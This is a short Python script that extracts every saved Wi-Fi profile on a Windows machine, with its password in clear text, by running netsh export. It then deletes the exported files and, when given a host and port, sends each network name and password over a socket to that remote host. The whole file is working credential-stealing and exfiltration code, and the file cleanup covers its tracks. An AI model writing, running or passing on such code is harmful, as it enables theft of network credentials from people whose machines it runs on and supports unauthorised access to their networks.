import os
import sys
import socket
from time import sleep
import subprocess as sp
from xml.dom import minidom


def connection(host, port, tries):
    s = socket.socket()
    for i in range(int(tries)):
        try:
            s.connect((host, port))
        except ConnectionRefusedError:
            sleep(0.5)
            print(f"Connection refused ({i+1}/{tries})", end="\r")
        else:
            return s

def extract_all():
    sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
    xmls = []
    wifis = []
    for file in os.listdir():
        if file.endswith(".xml") and file.startswith("Wi-Fi"):
            xmls.append(file)


    for xml in xmls:
        file = minidom.parse(xml)
        try:
            psw = file.getElementsByTagName("keyMaterial")[0].firstChild.data
        except IndexError:
            psw = "No Password"

        name = file.getElementsByTagName("name")[0].firstChild.data
        #print(name+" : "+psw)
        wifis.append(name+" : "+psw)

    for file in xmls:
        os.remove(file)

    return wifis

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
    s = connection(host, port, 13)
    for wifi in extract_all():
        s.send(f"{wifi}\n".encode())
else:
    for wifi in extract_all():
        print(wifi)

print(len(sys.argv))